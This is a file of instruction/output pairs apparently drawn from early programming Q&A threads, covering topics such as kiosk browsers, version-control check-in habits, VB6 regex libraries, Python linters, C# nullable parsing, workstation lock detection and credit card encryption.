{"instruction": "I am in a position where I can choose the client browser for my web app. The app is being used internally, and we are installing each client \"manually\".I would like to find a better solution for the browser,so :\nWhat is a good browser that I can use as a client to a web application?\nGeneral functionalities I would like to have:\n\nopening the browser from a\nshortcut, directly to the application's URL \nability to restrict navigation to a set of allowed URLs \nfullscreen mode, no menu, no address bar\njavascript \ngood CSS support\nability to cancel Back button (or at least solve the \"Webpage has expired\" IE problem)\n\nIE7 and FireFox are good candidates, but each seem to have it's own problems and issues.", "output": "Firefox with a little elbow grease is your best bet. I've written locked down extensions (one that's full screen and great for digital signage) as well as Live CD to ease deployment."}
{"instruction": "I'm looking for the best algorithm to take array A {0,1,2,3} and make order it like array B {3,1,0,2}.  Any ideas?", "output": "If they are nearly the same then here is some pseudo code:\nMake an ArrayList\nCopy the contents of the smaller array to the arraylist\nfor each item I in the larger array\n    FInd I in the ArrayList\n    Append I to a new array\n    Remove I from the arraylist"}
{"instruction": "I'm looking for the best algorithm to take array A {0,1,2,3} and make order it like array B {3,1,0,2}.  Any ideas?", "output": "What you need to do is determine the ordering of B and then apply that ordering to A.  One way to accomplish this is to undo the ordering of B and keep track of what happens along the way.  Then you can do the reverse to A.\nHere's some sketchy C# (sorry, I haven't actually run this)...\nTake a copy of B:\nList<int> B2 = new List<int>(B);\n\nNow sort it, using a sort function that records the swaps:\nList<KeyValuePair<int,int>> swaps = new List<KeyValuePair<int,int>>();\nB2.Sort( delegate( int x, int y ) {\n   if( x<y ) return -1;\n   if( x==y ) return 0;\n   // x and y must be transposed, so assume they will be:\n   swaps.Add( new KeyValuePair<int,int>(x,y) );\n   return 1;\n});\n\nNow apply the swaps, in reverse order, to A:\nswaps.Reverse();\nforeach( KeyValuePair<int,int> x in swaps )\n{\n   int t = A[x.key];\n   A[x.key] = A[x.value];\n   A[x.value] = t;\n}\n\nDepending how the built-in sort algorithm works, you might need to roll your own.  Something nondestructive like a merge sort should give you the correct results."}
{"instruction": "We've got an interesting case where we are trying to determine how different instances of our app were launched. Is there any way for .NET to be able to query another running instance and get the command line parameters passed to that instance? I've not been able to find any way to do it in .NET so far, so I thought I'd check here to see if anyone had done anything like this before.", "output": "You can retrieve this information through WMI.\nSee the Win32_Process class, in particular its command line property.  This Code Project article provides pointers on how to do this,"}
{"instruction": "I have been told that there is a performance difference between the following code blocks.\nforeach (Entity e in entityList)\n{\n ....\n}\n\nand \nfor (int i=0; i<entityList.Count; i++)\n{\n   Entity e = (Entity)entityList[i];\n   ...\n}\n\nwhere\nList<Entity> entityList;\n\nI am no CLR expect but from what I can tell they should boil down to basically the same code.  Does anybody have concrete (heck, I'd take packed dirt) evidence one way or the other?", "output": "One point missed here:\nA List has a Count property, it internally keeps track of how many elements are in it.\nAn IEnumerable DOES NOT.  \nIf you program to the interface IEnumerable and use the count extention method it will enumerate just to count the elements.  \nA moot point though since in the IEnumerable you cannot refer to items by index.\nSo if you want to lock in to Lists and Arrays you can get small performance increases.\nIf you want flexability use foreach and program to IEnumerable. (allowing the use of linq and/or yield return)."}
{"instruction": "Does anyone have any experience with any COTS systems for managing workshops and the associated registrations, courses, communications, etc.?\nWe have a home-built Perl system that is about 8 years old and is currently embedded as an iframe in a SharePoint portal site (externally facing). Needless to say, it isn't integrated into our site well, looks like crap, needs an overhaul, lacks features, etc. It would be nice to find either a product we can install or a service that provides those features.\nThanks!", "output": "You might also look into Moodle - it's a platform developed to supplement classroom teaching (or implement online learning courses) but should have all the major features you listed, and would support your needs reasonably well, as well as enhancing your event with an online component such as slide/presentation distribution only to registered users or users that took a particular class, etc)"}
{"instruction": "I like putting shortcuts of the form \"g - google.lnk\" in my start menu so google is two keystrokes away. Win, g.\nMy eight or so most frequent applications go there.\nI also make links to my solution files I am always opening \"x - Popular Project.lnk\"\nAre there any better ways to automate opening frequently used applications?", "output": "For shortcuts I use Launchy\nFor macros I use AutoHotKey\nOthers will suggest SlickRun for shortcuts also."}
{"instruction": "We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.\nThis works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.\nMy initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?\n\nWe do use LabVIEW and I have checked the LAVA forums and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code.", "output": "There are lots and lots of classic peak detection methods, any of which might work.  You'll have to see what, in particular, bounds the quality of your data.  Here are basic descriptions:\n\nBetween any two points in your data, (x(0),y(0)) and (x(n),y(n)), add up y(i+1)-y(i) for 0 <= i < n and call this T (\"travel\") and set R (\"rise\") to y(n)- y(0) + k for suitably small k.  T/R > 1 indicates a peak.  This works OK if large travel due to noise is unlikely or if noise distributes symmetrically around a base curve shape.  For your application, accept the earliest peak with a score above a given threshold, or analyze the curve of travel per rise values for more interesting properties.\nUse matched filters to score similarity to a standard peak shape (essentially, use a normalized dot-product against some shape to get a cosine-metric of similarity)\nDeconvolve against a standard peak shape and check for high values (though I often find 2 to be less sensitive to noise for simple instrumentation output).\nSmooth the data and check for triplets of equally spaced points where, if x0 < x1 < x2, y1 > 0.5*(y0+y2), or check Euclidean distances like this:  D((x0,y0),(x1,y1)) + D((x1,y1),(x2,y2)) > D((x0,y0),(x2,y2)), which relies on the triangle inequality.  Using simple ratios will again provide you a scoring mechanism.\nFit a very simple 2-gaussian mixture model to your data (for example, Numerical Recipes has a nice ready-made chunk of code).  Take the earlier peak.  This will deal correctly with overlapping peaks.\nFind the best match in the data to a simple Gaussian, Cauchy, Poisson, or what-have-you curve.  Evaluate this curve over a broad range and subtract it from a copy of the data after noting it's peak location.  Repeat.  Take the earliest peak whose model parameters (standard deviation probably, but some applications might care about kurtosis or other features) meet some criterion.  Watch out for artifacts left behind when peaks are subtracted from the data.\nBest match might be determined by the kind of match scoring suggested in #2 above.\n\nI've done what you're doing before:  finding peaks in DNA sequence data, finding peaks in derivatives estimated from measured curves, and finding peaks in histograms.\nI encourage you to attend carefully to proper baselining.  Wiener filtering or other filtering or simple histogram analysis is often an easy way to baseline in the presence of noise.\nFinally, if your data is typically noisy and you're getting data off the card as unreferenced single-ended output (or even referenced, just not differential), and if you're averaging lots of observations into each data point, try sorting those observations and throwing away the first and last quartile and averaging what remains.  There are a host of such outlier elimination tactics that can be really useful."}
{"instruction": "I like putting shortcuts of the form \"g - google.lnk\" in my start menu so google is two keystrokes away. Win, g.\nMy eight or so most frequent applications go there.\nI also make links to my solution files I am always opening \"x - Popular Project.lnk\"\nAre there any better ways to automate opening frequently used applications?", "output": "Get a keyboard launcher program like Launchy"}
{"instruction": "I like putting shortcuts of the form \"g - google.lnk\" in my start menu so google is two keystrokes away. Win, g.\nMy eight or so most frequent applications go there.\nI also make links to my solution files I am always opening \"x - Popular Project.lnk\"\nAre there any better ways to automate opening frequently used applications?", "output": "AutoHotkey is a reasonably good program for implementing windows key shortcuts.  You might instead define WIN + G to be \"open browser to google\" which gives you a better response time (don't have to wait for start menu to popup, etc)\nThere are macro programs that change the macros used based on the window that's in focus.  I've never needed that much control, but you might want to look into that.\n-Adam"}
{"instruction": "I like putting shortcuts of the form \"g - google.lnk\" in my start menu so google is two keystrokes away. Win, g.\nMy eight or so most frequent applications go there.\nI also make links to my solution files I am always opening \"x - Popular Project.lnk\"\nAre there any better ways to automate opening frequently used applications?", "output": "I use a lot the \"intellisense\" snippets in Visual Studio. You can include your own snippets and press double tab when they appear in the list. That's definitely a time saver."}
{"instruction": "I'm almost certain I know the answer to this question, but I'm hoping there's something I've overlooked.\nCertain applications seem to have the Vista Aero look and feel to their caption bars and buttons even when running on Windows XP. (Google Chrome and  Windows Live Photo Gallery come to mind as examples.)  I know that one way to accomplish this from WinForms would be to create a borderless form and draw the caption bar/buttons yourself, then overriding WndProc to make sure moving, resizing, and button clicks do what they're supposed to do (I'm not clear on the specifics but could probably pull it off given a day to read documentation.)  I'm curious if there's a different, easier way that I'm overlooking.  Perhaps some API calls or window styles I've overlooked?\nI believe Google has answered it for me by using the roll-your-own-window approach with Chrome.  I will leave the question open for another day in case someone has new information, but I believe I have answered the question myself.", "output": "Google Chrome is not using the Vista SDK to achieve this on XP.  If you peek into src\\chrome\\browser\\views\\frame there are several files to define the browser frame depending on the capabilities of the system.  On XP, it looks like OpaqueFrame is used; line 19 has this to say:\n// OpaqueFrame\n//\n//  OpaqueFrame is a CustomFrameWindow subclass that in conjunction with\n//  OpaqueNonClientView provides the window frame on Windows XP and on Windows\n//  Vista when DWM desktop compositing is disabled. The window title and\n//  borders are provided with bitmaps.\nIt looks like it's using the resources in src\\chrome\\app\\theme to draw the frame buttons.\nSo it looks like my hopes that there's some kind of cheap way to enable Vista theming on XP are dashed.  The only way to do it is to manually draw the non-client area of your window.  I believe something like this is probably the right track, since it lets Windows handle the non-client stuff like moving and resizing the window.\nUnless someone can find a method to magically enable the Vista theming on XP, this is the answer to the question but I obviously cannot mark my own post as the answer."}
{"instruction": "We've been using \"Drip\" to try and identify why pages with UpdatePanels in them tend to use a lot of client-side memory.  With a page with a regular postback, we are seeing 0 leaks detected by Drip.  However, when we add an update panel to the mix, every single DOM object that is inside of the update panel appears to leak (according to Drip).\nI am not certain is Drip is reliable enough to report these kinds of things - the reported leaks do seem to indicate Drip is modifying the page slightly.  \nDoes anyone have any experience with this?  Should I panic and stop using Microsoft Ajax?  I'm not above doubting Microsoft, but it seems fishy to me that it could be this bad.\nAlso, if you know of a tool that is better than Drip, that would be helpful as well.", "output": "you could attach to the pageLoading event of the PageRequestManager class and go through the panels updating property and remove the DOM elements in each."}
{"instruction": "Every time I publish the application in ClickOnce I get get it to update the revision number by one. Is there a way to get this change automatically to change the version number in AssemblyInfo.cs file (all our error reporting looks at the Assembly Version)?", "output": "You'll probably need to create a piece of code that updates AssemblyInfo.cs according to the version number stored in the .csproj file. (The ClickOnce deploy version is stored inside an XML tag.)\nYou'd then change your .csproj file to run this bit of code when Publish|Release build is performed. The MSBuild folks have blogged about how to perform custom actions during certain build types; check the MSBuild team blog."}
{"instruction": "In my current job the supervisor's practice is to only check in production ready code.  Most recently the project I was on involved work by 3 different developers with some file overlap.  This meant manually integrating changes despite the fact that some changes took a day and then it was done.  I wanted to see if this was a common practice and get suggestions on how to change this practice with the knowledge that many times my opinion means little in the grand scheme of things.", "output": "Code that is checked in should be unit tested, but, to me, \"production ready\" implies that it's gone through integration and system testing. You can't do that until a code freeze, so I don't see how you can do that before every check in."}
{"instruction": "In my current job the supervisor's practice is to only check in production ready code.  Most recently the project I was on involved work by 3 different developers with some file overlap.  This meant manually integrating changes despite the fact that some changes took a day and then it was done.  I wanted to see if this was a common practice and get suggestions on how to change this practice with the knowledge that many times my opinion means little in the grand scheme of things.", "output": "I would personally not approve of this because sometimes that's the best way to catch problem code with less experienced developers (by seeing it as they are working on it) and when you \"check in early and often\" you can rollback to earlier changes you made (as you were developing) if you decide that some changes you made earlier was actually a better idea."}
{"instruction": "In my current job the supervisor's practice is to only check in production ready code.  Most recently the project I was on involved work by 3 different developers with some file overlap.  This meant manually integrating changes despite the fact that some changes took a day and then it was done.  I wanted to see if this was a common practice and get suggestions on how to change this practice with the knowledge that many times my opinion means little in the grand scheme of things.", "output": "wouldn't it be a good idea to have a testing branch of the repo that can have the non \"production ready code\" checked in after the changes are done and tested?\nthe main trunk should never have code checked in that breaks the build and doesn't pass unit tests, but branches don't have to have all those restrictions in place."}
{"instruction": "In my current job the supervisor's practice is to only check in production ready code.  Most recently the project I was on involved work by 3 different developers with some file overlap.  This meant manually integrating changes despite the fact that some changes took a day and then it was done.  I wanted to see if this was a common practice and get suggestions on how to change this practice with the knowledge that many times my opinion means little in the grand scheme of things.", "output": "You can use various ways to handle this situation, depending on your source control system. \nPrivate branches: Allow you to check in and work on code while you go, merging back and forth at appropriate times.\nShelvesets/pacakaged changesets: Allow you to store changesets and send them around for review - ensuring they're production ready before check in.\nAs to whether this is an appropriate way to work, we don't allow check-in to main branches without prior review. To pass review your code must pass various automated tools, and then must be acceptable to your peer reviewer. For some definitions of \"production ready\" - this is it. Therefore, we do something like what you do. However, we use private branches to ensure that check-ins can still be made while this is in progress, and that other check-ins don't have to interfere. \nIf production ready means tested in an integration environment, then it sounds like you may need staging branches or something similar."}
{"instruction": "In my current job the supervisor's practice is to only check in production ready code.  Most recently the project I was on involved work by 3 different developers with some file overlap.  This meant manually integrating changes despite the fact that some changes took a day and then it was done.  I wanted to see if this was a common practice and get suggestions on how to change this practice with the knowledge that many times my opinion means little in the grand scheme of things.", "output": "I think it may be the version control we user, VSS in combination with a lack of time to learn the branching.  I really like the idea of nightly check ins to help with development and avoid 'Going Dark'.  I can see him being resistant to the trunks but perhaps building a development SS and when the code is production ready move it to production SS."}
{"instruction": "I need to write a program that can sift through specially-formatted text files (essentially CSV files with a fixed set of column types that have different delimiters for some columns ... comma in most places, colons in others) to search for formatting errors.  I figure regular expressions will be the way to go.\nThe question:  Is there a good regex library for VB6?\nThank you!\nEdit:  Holy crap, 3 responses in under an hour.  Thanks a ton, folks!  I've heard such good things about Regex Buddy from Jeff's postings / podcasting, that I will have to take a look.", "output": "Use the Regex COM component built into Windows. You can find a step by step on referencing and using it in your project at: http://www.regular-expressions.info/vb.html"}
{"instruction": "In my current job the supervisor's practice is to only check in production ready code.  Most recently the project I was on involved work by 3 different developers with some file overlap.  This meant manually integrating changes despite the fact that some changes took a day and then it was done.  I wanted to see if this was a common practice and get suggestions on how to change this practice with the knowledge that many times my opinion means little in the grand scheme of things.", "output": "From the practices I have seen the term production quality is used as a 'frightener' to ensure that people are scared of breaking top of tree, not a bad thing to be honest because top of tree should always work if possible.\nI would say that best practice is that you should only be merging distinct (i.e. seperate) functional components on the top of tree. If you have a significant overlap on deltas to the same source files I think this 'might' indicate that somewhere along the line the project management has broken down, and that those developers should have merged their changes to seperate integration branch before going in to the main line sources. An individual developer saying that they unit tested their stuff is irrelevant, because the thing they tested has changed!\nTrying to solve integration problems on your main line codeline will inevitably stall other unrelated submissions."}
{"instruction": "In my current job the supervisor's practice is to only check in production ready code.  Most recently the project I was on involved work by 3 different developers with some file overlap.  This meant manually integrating changes despite the fact that some changes took a day and then it was done.  I wanted to see if this was a common practice and get suggestions on how to change this practice with the knowledge that many times my opinion means little in the grand scheme of things.", "output": "Assuming that you are working in a centralized version control system (such as Subversion), and assuming that you have a concept of \"the trunk\" (where the latest well-working code lives):\nIf you work on new features in \"features branches\"/\"experimental branches\", then it's OK to commit code which is far from finished. (When the feature is done, you commit the well-behaving result into the \"trunk\".)\nBut you will not win a popularity contest if committing non-compiling/obviously non-working code into the \"trunk\" or a \"release branch\".\nThe Pragmatic Programmers have a book called Pragmatic Version Control using Subversion which includes a section with advice about branches."}
{"instruction": "I need to write a program that can sift through specially-formatted text files (essentially CSV files with a fixed set of column types that have different delimiters for some columns ... comma in most places, colons in others) to search for formatting errors.  I figure regular expressions will be the way to go.\nThe question:  Is there a good regex library for VB6?\nThank you!\nEdit:  Holy crap, 3 responses in under an hour.  Thanks a ton, folks!  I've heard such good things about Regex Buddy from Jeff's postings / podcasting, that I will have to take a look.", "output": "Regex Buddy has a VB6 library\nI use this in Delphi and it's very good - and Jeff has raved about RegexBuddy on several occasions.\nI can't speak for the VB implementation, but it's certainly worth a look."}
{"instruction": "I need to write a program that can sift through specially-formatted text files (essentially CSV files with a fixed set of column types that have different delimiters for some columns ... comma in most places, colons in others) to search for formatting errors.  I figure regular expressions will be the way to go.\nThe question:  Is there a good regex library for VB6?\nThank you!\nEdit:  Holy crap, 3 responses in under an hour.  Thanks a ton, folks!  I've heard such good things about Regex Buddy from Jeff's postings / podcasting, that I will have to take a look.", "output": "As you probably know, VB6 didn't ship with a built-in regular expression library.  You can, however, use one provided by an ActiveX or COM library.  See this article for details."}
{"instruction": "In my current job the supervisor's practice is to only check in production ready code.  Most recently the project I was on involved work by 3 different developers with some file overlap.  This meant manually integrating changes despite the fact that some changes took a day and then it was done.  I wanted to see if this was a common practice and get suggestions on how to change this practice with the knowledge that many times my opinion means little in the grand scheme of things.", "output": "Check in early and check in often for two main reasons - \n1 - it might make it easier to integrate code\n2 - in case your computer explodes your weeks of work isn't gone"}
{"instruction": "In my current job the supervisor's practice is to only check in production ready code.  Most recently the project I was on involved work by 3 different developers with some file overlap.  This meant manually integrating changes despite the fact that some changes took a day and then it was done.  I wanted to see if this was a common practice and get suggestions on how to change this practice with the knowledge that many times my opinion means little in the grand scheme of things.", "output": "@bpapa\nNightly backups of work folders to servers will prevent losing more than a days work.  \n@tonyo\nLet's see the requirement documents were completed the day after we finished coding.  Does that tell you about our project management?  \nWe are a small shop so while you would think change is easy there are some here that are unbending to the old ways."}
{"instruction": "In simple terms, what are the reasons for, and what are the differences between the GPL v2 and GPL v3 open source licenses? Explanations and references to legal terms and further descriptions would be appreciated.", "output": "The page linked to in another answer is a good source, but a lot to read.  Here is a short list of some the major differences:\n\ninternationalization: they used new terminology, rather than using language tied to US legal concepts\npatents: they specifically address patents (including the Microsoft/Novell issue noted in another answer)\n\u201cTivo-ization\u201d: they address the restrictions (like Tivo\u2019s) in consumer products that take away, though hardware, the ability to modify the software\nDRM: they address digital rights management (which they call digital restrictions management)\ncompatibility: they addressed compatibility with some other open source licenses\ntermination: they addressed specifically what happens if the license is violated and the cure of violations\n\nI agree with the comment about consulting a lawyer (one who knows about software license issues, though). In doing these things (and more), they more than doubled the length of the GPL. Although GPLv3 is a complex legal document, it was designed to be read and reasonable understood by software developers. There is also a guide to understanding it and in depth discussion of the changes from v2 to v3 at http://copyleft.org/guide/."}
{"instruction": "I am using MSBuild to build my stuff. I want to use CruiseControl.net as by Build Server.\nNow, CCNET refers nAnt a lot, but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild. Also, nAnt seems a bit unsupported, with a Beta release that is almost a year old now.\nIn short: I am actually quite happy with MSBuild (especially since it's the \"official\" compiler front end) and a bit uncomfortable with nAnt, but I do not want to judge prematurely.\nWhat would be reasons to use nAnt over MSBuild? Especially with ccnet, which seems to overlap a bit with nant in terms of features (and adding the automated build related stuff)", "output": "Like what so many people have already indicated, the answer here is \"it depends\". There are some things like repeating operations that are much simpler and cleaner in NAnt. See the MSDN forums for a discussion about this."}
{"instruction": "What's the best way to implement a SQL script that will grant select, references, insert, update, and delete permissions to a database role on all the user tables in a database?\nIdeally, this script could be run multiple times, as new tables were added to the database. SQL Server Management Studio generates scripts for individual database objects, but I'm looking for more of a \"fire-and-forget\" script.", "output": "I'm sure there is an easier way, but you could loop through the sysobjects table in the database and grant permissions to any user table objects that exist.  You could then run that multiple times whenever new tables are added."}
{"instruction": "In my current job the supervisor's practice is to only check in production ready code.  Most recently the project I was on involved work by 3 different developers with some file overlap.  This meant manually integrating changes despite the fact that some changes took a day and then it was done.  I wanted to see if this was a common practice and get suggestions on how to change this practice with the knowledge that many times my opinion means little in the grand scheme of things.", "output": "An approach I particularly like is to have different life cycle versions in the depot. That is,for example, have a dev version of the code that is where the developers check in code that is in being worked on; then you could have a beta version, where you could add beta fixes to your code; and then a production version.  \nThere is obvious overhead in this approach, such as the fact that you will have a larger workspace on you local machine, the fact that you will need need to have a migration process into place to move code from one stage to the next (which means a code freeze when doing the integration testing that goes with the migration), and that depending on the complexity of the project(s) you might need to have tools that change settings, environment variables, registry entries, etc.\nAll of this is a pain to set up, but you only do it once, and once you have it all in place, makes working on different stages of the code a breeze."}
{"instruction": "Does anybody know any good resources for learning how to program CIL with in-depth descriptions of commands, etc.? I have looked around but not found anything particularly good.", "output": "Expert .NET 2.0 IL Assembler  by Serge Lidin\nThere was a 1.1 version of the same book, but I haven't seen anything for the latest .NET release.  It's an excellent book.  I used it to write an OCR component in MSIL, as a learning project.\n[Edit] @Curt is right, 3.0 and 3.5 are just extensions to 2.0, I hadn't plugged that in to my head yet.  Now I've thought of a fun geek project... compare the disassembly of standard 2.0 code to the new LINQ/Lambda way of performing common tasks like filtering lists.  For some reason I assumed that the magic was happening in new IL features, not just the compiler."}
{"instruction": "Does anybody know any good resources for learning how to program CIL with in-depth descriptions of commands, etc.? I have looked around but not found anything particularly good.", "output": "The only CIL book on my shelf is Expert .NET 2.0 IL Assembler by Serge Lidin.  In terms of what the individual opcodes do or mean, the Microsoft documentation on System.Reflection.Emit has some pretty good information.  And it's always useful to look at existing IL with Reflector.\nEdit: CIL (and indeed the CLR in general) has not changed at all between .NET 2.0 and .NET 3.5 -- the underlying runtime is basically the same, modulo fixes and performance improvements.  So there's nothing newer available on a CIL level than what would be in a book on 2.0"}
{"instruction": "I'm writing up some productivity/metrics tools for myself to help monitor my focus throughout the day. Recently, I've noticed that I tend to get off track more than usual and feel the need to get up and go for walks/drinks/etc and I'm concerned that I'm \"wasting\" too much time.\nSince I always lock my computer when I go anywhere, and I unlock it as soon as I return (even if I'm just reading at my desk, etc), I was wondering how I can determine, in code, how long the machine is locked.\nI'm writing this in C# if that helps, but I'm open to other ideas.\n\nI like the windows service idea (and have accepted it) for simplicity and cleanliness, but unfortunately I don't think it will work for me in this particular case. I wanted to run this on my workstation at work rather than home (or in addition to home, I suppose), but it's locked down pretty hard courtesy of the DoD. That's part of the reason I'm rolling my own, actually.\nI'll write it up anyway and see if it works. Thanks everyone!", "output": "The solution is to use the OpenDesktop API call. Basically it just attempts to switch the the default desktop which will fail if it's locked.\nNote1: the following function loads the relevant dlls and functions dynamically so that apps will still run on Windows 9.x :)\nNote2: DESKTOP& #95;SWITCHDESKTOP should read DESKTOP_SWITCHDESKTOP\nBOOL Misc::IsWorkStationLocked()\n{\n    // note: we can't call OpenInputDesktop directly because it's not\n    // available on win 9x\n    typedef HDESK (WINAPI *PFNOPENDESKTOP)(LPSTR lpszDesktop, DWORD dwFlags, BOOL fInherit, ACCESS_MASK dwDesiredAccess);\n    typedef BOOL (WINAPI *PFNCLOSEDESKTOP)(HDESK hDesk);\n    typedef BOOL (WINAPI *PFNSWITCHDESKTOP)(HDESK hDesk);\n\n    // load user32.dll once only\n    static HMODULE hUser32 = LoadLibrary(\"user32.dll\");\n\n    if (hUser32)\n    {\n    \tstatic PFNOPENDESKTOP fnOpenDesktop = (PFNOPENDESKTOP)GetProcAddress(hUser32, \"OpenDesktopA\");\n    \tstatic PFNCLOSEDESKTOP fnCloseDesktop = (PFNCLOSEDESKTOP)GetProcAddress(hUser32, \"CloseDesktop\");\n    \tstatic PFNSWITCHDESKTOP fnSwitchDesktop = (PFNSWITCHDESKTOP)GetProcAddress(hUser32, \"SwitchDesktop\");\n\n    \tif (fnOpenDesktop && fnCloseDesktop && fnSwitchDesktop)\n    \t{\n    \t\tHDESK hDesk = fnOpenDesktop(\"Default\", 0, FALSE, DESKTOP_SWITCHDESKTOP);\n\n    \t\tif (hDesk)\n    \t\t{\n    \t\t\tBOOL bLocked = !fnSwitchDesktop(hDesk);\n\n    \t\t\t// cleanup\n    \t\t\tfnCloseDesktop(hDesk);\n\n    \t\t\treturn bLocked;\n    \t\t}\n    \t}\n    }\n\n    // must be win9x\n    return FALSE;\n}"}
{"instruction": "I am starting to use Python (specifically because of Django) and I would like to remove the burden for exhaustive testing by performing some static analysis.  What tools/parameters/etc. exist to detect issues at compile time that would otherwise show up during runtime? (type errors are probably the most obvious case of this, but undefined variables are another big one that could be avoided with an in-depth analysis of the AST.)\nObviously testing is important, and I don't imply that tests can be obviated entirely; however, there are many runtime errors in python that are not possible in other languages that perform stricter run-time checking -- I'm hoping that there are tools to bring at least some of these capabilities to python as well.", "output": "Here are my first impressions of pyflakes, pychecker and pylint:\n\npychecker: It crashes frequently, most of the runs I tried resulted in Errors that originated in the pychecker code (eg: AttributeError or IndexError: list index out of range were the most common).  For some reason I had to set the DJANGO_SETTINGS_MODULE environment variable before it would even run on any of the app code, and the documentation is very sparse.\npyflakes: 'pyflakes --help' throws a TypeError -- erm... Documentation is also very sparse, and pyflakes is very forgiving (as far as I can tell, it only reports compile errors, warnings, redefinitions, and some concerns about imports--such as unused and wildcards).  pyflakes also seems to repeat itself:\n\neventlist/views.py:4: 'Http404' imported but unused\n      eventlist/views.py:4: 'Http404' imported but unused\n      eventlist/views.py:5: 'from eventlist.models import *' used; unable to detect undefined names\n      eventlist/views.py:59: 'authenticate' imported but unused\n      eventlist/views.py:61: redefinition of unused 'login' from\n  line 59\n      eventlist/views.py:5: 'from eventlist.models import *' used;\n  unable to detect undefined names \n     eventlist/views.py:4: 'Http404' imported but unused\n\npylint: This seems to be the most capable of the tools suggested.  It has the best documentation.  LogiLab provides a tutorial, pylint has a help screen, and there is a (broken) link to a user manual, which would be extremely helpful.  There are some issues with applying pylint to django, since pylint doesn't know about the django classes (such as models.Model).  This means that a fair number of otherwise valuable errors are generated about missing class fields.  eg:\n\nE:105:get_events_by_tag: Class 'Tag' has no 'objects' member\n\nParsing these out automatically will be very difficult without some additional knowledge of the classes in use.  I'm not sure adding that is feasible, but it does seem likely that pylint is capable of dealing with this in the \"right\" way.  (I probably just need to point it to the django source, but there are no command line params that look likely, and, as mentioned earlier, the user manual is inaccessible.)\n\nFor the moment, I'm still looking into pylint -- pychecker and pyflakes need better documentation and they need to become more robust."}
{"instruction": "I want to use the  MultipleLookupField control in a web page that will run in the context of SharePoint. I was wondering if anyone would help me with an example, which shows step by step how to use the control two display two SPField Collections.", "output": "Hm. OK, I'm still trying to break mine... so I went to the layouts directory and created a file foo.aspx. Here it is:\n<%@ Page Language=\"C#\" Inherits=\"System.Web.UI.Page\" MasterPageFile=\"~/_layouts/simple.master\" %> \n<%@ Register Tagprefix=\"foo\" Namespace=\"Foople\" Assembly=\"Foople, Version=1.0.0.0, Culture=neutral, PublicKeyToken=9f4da00116c38ec5\"%>\n<asp:Content ContentPlaceHolderId=\"PlaceHolderMain\" runat=\"server\">\n<foo:WebPart1 id=\"fred\" runat=\"server\" />\n<foo:WebPart1a id=\"barney\" runat=\"server\" />\n</asp:Content>\n\nWebPart1 is the webpart from before. WebPart1a is the exact same code, but in a class that inherits directly from WebControl rather than from WebPart.\nIt works fine, apart from a security validation problem on the postback that I can't be bothered to debug.\nChanging the masterpage to ~masterurl/default.master, I uploaded foo.aspx to the Shared Documents library, and it works fine from there too -- both the WebControl and the WebPart behave properly, and the security problem is gone too.\nSo I'm at a loss. Although I did notice this page with an obscure might-be-bug which is also in SPFolder.get_ContentTypeOrder(): http://forums.msdn.microsoft.com/en-US/sharepointdevelopment/thread/63baf273-7f36-453e-8293-26417759e2e1/\nAny chance you could post your code?"}
{"instruction": "I'm wanting to parse a string into a nullable int in C#.  ie. I want to get back either the int value of the string or null if it can't be parsed.\nI was kind of hoping that this would work\nint? val = stringVal as int?;\n\nBut that won't work, so the way I'm doing it now is I've written this extension method\npublic static int? ParseNullableInt(this string value)\n{\n\tif (value == null || value.Trim() == string.Empty)\n\t{\n\t\treturn null;\n\t}\n\telse\n\t{\n\t\ttry\n\t\t{\n\t\t\treturn int.Parse(value);\n\t\t}\n\t\tcatch\n\t\t{\n\t\t\treturn null;\n\t\t}\n\t}\n}\n\nIs there a better way of doing this?\nEDIT:  Thanks for the TryParse suggestions, I did know about that, but it worked out about the same.  I'm more interested in knowing if there is a built-in framework method that will parse directly into a nullable int?", "output": "int.TryParse is probably a tad easier:\npublic static int? ToNullableInt(this string s)\n{\n    int i;\n    if (int.TryParse(s, out i)) return i;\n    return null;\n}\n\nEdit @Glenn int.TryParse is \"built into the framework\". It and int.Parse are the way to parse strings to ints."}
{"instruction": "I'm wanting to parse a string into a nullable int in C#.  ie. I want to get back either the int value of the string or null if it can't be parsed.\nI was kind of hoping that this would work\nint? val = stringVal as int?;\n\nBut that won't work, so the way I'm doing it now is I've written this extension method\npublic static int? ParseNullableInt(this string value)\n{\n\tif (value == null || value.Trim() == string.Empty)\n\t{\n\t\treturn null;\n\t}\n\telse\n\t{\n\t\ttry\n\t\t{\n\t\t\treturn int.Parse(value);\n\t\t}\n\t\tcatch\n\t\t{\n\t\t\treturn null;\n\t\t}\n\t}\n}\n\nIs there a better way of doing this?\nEDIT:  Thanks for the TryParse suggestions, I did know about that, but it worked out about the same.  I'm more interested in knowing if there is a built-in framework method that will parse directly into a nullable int?", "output": "Try this:\npublic static int? ParseNullableInt(this string value)\n{\n    int intValue;\n    if (int.TryParse(value, out intValue))\n        return intValue;\n    return null;\n}"}
{"instruction": "The .NET System.Security.Cryptography namespace has a rather bewildering collection of algorithms that I could use for encryption of credit card details. Which is the best?\nIt clearly needs to be secure for a relatively short string. \nEDIT: I'm in the UK, where I understand we're OK storing encrypted credit card details so long as the three-digit CVV number is never stored. And thanks all for the great responses.", "output": "Don't forget about integrity here. There are forgery attacks against out-of-the-box crypto when the attacker doesn't know the key, but can manipulate the ciphertext.  These can be particularly nasty when:\n\nencrypting short strings,\nwith known substrings\n\nThat's exactly the case for credit cards.  So using System.Security.Cryptography AES or 3DES in CBC mode without rolling your own checksum can be dangerous.  Read: there's some chance an attacker without the secret key could replace one credit card number with another."}
